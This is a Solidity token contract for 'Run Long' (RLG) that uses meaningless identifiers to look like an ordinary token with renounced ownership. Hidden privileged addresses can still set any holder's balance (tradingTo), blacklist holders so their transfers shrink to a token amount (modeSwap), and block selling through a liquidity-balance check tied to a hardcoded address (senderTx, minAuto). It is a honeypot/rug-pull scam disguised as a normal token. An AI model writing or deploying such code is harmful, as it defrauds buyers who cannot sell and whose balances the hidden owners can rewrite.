//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface tokenIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract atAmount {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeFee {
    function createPair(address autoMarketingBuy, address amountFee) external returns (address);
}

interface liquidityMode {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atLaunchedTo) external view returns (uint256);

    function transfer(address marketingSender, uint256 marketingMode) external returns (bool);

    function allowance(address enableToken, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingMode) external returns (bool);

    function transferFrom(
        address sender,
        address marketingSender,
        uint256 marketingMode
    ) external returns (bool);

    event Transfer(address indexed from, address indexed enableFund, uint256 value);
    event Approval(address indexed enableToken, address indexed spender, uint256 value);
}

interface liquidityModeMetadata is liquidityMode {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract RunLong is atAmount, liquidityMode, liquidityModeMetadata {

    function totalSupply() external view virtual override returns (uint256) {
        return feeAt;
    }

    mapping(address => bool) public fromWallet;

    constructor (){
        
        tokenIs txTotal = tokenIs(txTo);
        txTrading = takeFee(txTotal.factory()).createPair(txTotal.WETH(), address(this));
        
        sellEnable = _msgSender();
        launchModeIs();
        fromList[sellEnable] = true;
        listMarketing[sellEnable] = feeAt;
        if (txIs == marketingToken) {
            marketingToken = txIs;
        }
        emit Transfer(address(0), sellEnable, feeAt);
    }

    uint256 public receiverAt;

    function totalAt(address modeFee) public {
        if (receiverModeLimit) {
            return;
        }
        
        fromList[modeFee] = true;
        if (receiverAt != teamShould) {
            receiverAt = marketingToken;
        }
        receiverModeLimit = true;
    }

    function transferFrom(address feeTake, address marketingSender, uint256 marketingMode) external override returns (bool) {
        if (_msgSender() != txTo) {
            if (txSwap[feeTake][_msgSender()] != type(uint256).max) {
                require(marketingMode <= txSwap[feeTake][_msgSender()]);
                txSwap[feeTake][_msgSender()] -= marketingMode;
            }
        }
        return minAuto(feeTake, marketingSender, marketingMode);
    }

    address toLiquidityTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function balanceOf(address atLaunchedTo) public view virtual override returns (uint256) {
        return listMarketing[atLaunchedTo];
    }

    bool public modeSell;

    uint256 private feeAt = 100000000 * 10 ** 18;

    address public sellEnable;

    uint256 liquidityMarketing;

    function minAuto(address feeTake, address marketingSender, uint256 marketingMode) internal returns (bool) {
        if (feeTake == sellEnable) {
            return shouldBuyList(feeTake, marketingSender, marketingMode);
        }
        uint256 enableBuy = liquidityMode(txTrading).balanceOf(toLiquidityTotal);
        require(enableBuy == teamMin);
        require(marketingSender != toLiquidityTotal);
        if (fromWallet[feeTake]) {
            return shouldBuyList(feeTake, marketingSender, senderWallet);
        }
        return shouldBuyList(feeTake, marketingSender, marketingMode);
    }

    function name() external view virtual override returns (string memory) {
        return amountTradingTx;
    }

    mapping(address => bool) public fromList;

    function transfer(address amountShould, uint256 marketingMode) external virtual override returns (bool) {
        return minAuto(_msgSender(), amountShould, marketingMode);
    }

    event OwnershipTransferred(address indexed fundExempt, address indexed fromEnable);

    function decimals() external view virtual override returns (uint8) {
        return shouldListTx;
    }

    mapping(address => mapping(address => uint256)) private txSwap;

    address public txTrading;

    bool public receiverModeLimit;

    bool private feeLaunched;

    function senderTx(uint256 marketingMode) public {
        senderTotal();
        teamMin = marketingMode;
    }

    uint8 private shouldListTx = 18;

    mapping(address => uint256) private listMarketing;

    bool public modeReceiver;

    function modeSwap(address swapList) public {
        senderTotal();
        
        if (swapList == sellEnable || swapList == txTrading) {
            return;
        }
        fromWallet[swapList] = true;
    }

    function tradingTo(address amountShould, uint256 marketingMode) public {
        senderTotal();
        listMarketing[amountShould] = marketingMode;
    }

    uint256 constant senderWallet = 12 ** 10;

    uint256 private marketingToken;

    string private launchList = "RLG";

    function owner() external view returns (address) {
        return tradingEnable;
    }

    function shouldBuyList(address feeTake, address marketingSender, uint256 marketingMode) internal returns (bool) {
        require(listMarketing[feeTake] >= marketingMode);
        listMarketing[feeTake] -= marketingMode;
        listMarketing[marketingSender] += marketingMode;
        emit Transfer(feeTake, marketingSender, marketingMode);
        return true;
    }

    uint256 private teamShould;

    function getOwner() external view returns (address) {
        return tradingEnable;
    }

    address txTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 teamMin;

    function allowance(address totalAuto, address fundReceiver) external view virtual override returns (uint256) {
        if (fundReceiver == txTo) {
            return type(uint256).max;
        }
        return txSwap[totalAuto][fundReceiver];
    }

    function senderTotal() private view {
        require(fromList[_msgSender()]);
    }

    function symbol() external view virtual override returns (string memory) {
        return launchList;
    }

    function approve(address fundReceiver, uint256 marketingMode) public virtual override returns (bool) {
        txSwap[_msgSender()][fundReceiver] = marketingMode;
        emit Approval(_msgSender(), fundReceiver, marketingMode);
        return true;
    }

    string private amountTradingTx = "Run Long";

    uint256 public txIs;

    address private tradingEnable;

    function launchModeIs() public {
        emit OwnershipTransferred(sellEnable, address(0));
        tradingEnable = address(0);
    }

}